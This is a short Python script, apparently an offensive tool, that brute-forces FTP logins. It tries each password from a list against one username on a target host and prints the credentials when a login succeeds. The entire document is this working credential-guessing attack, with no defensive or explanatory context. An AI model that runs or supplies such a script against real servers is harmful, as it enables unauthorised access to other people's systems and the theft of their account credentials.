import ftplib

def brute_force_ftp(host, username, password_list):
    with ftplib.FTP() as ftp:
        for password in password_list:
            try:
                ftp.connect(host, 21, timeout=3)
                ftp.login(user=username, passwd=password)
                print(f"Success: {username}:{password}")
                return
            except ftplib.error_perm:
                continue
    print("Brute force failed.")
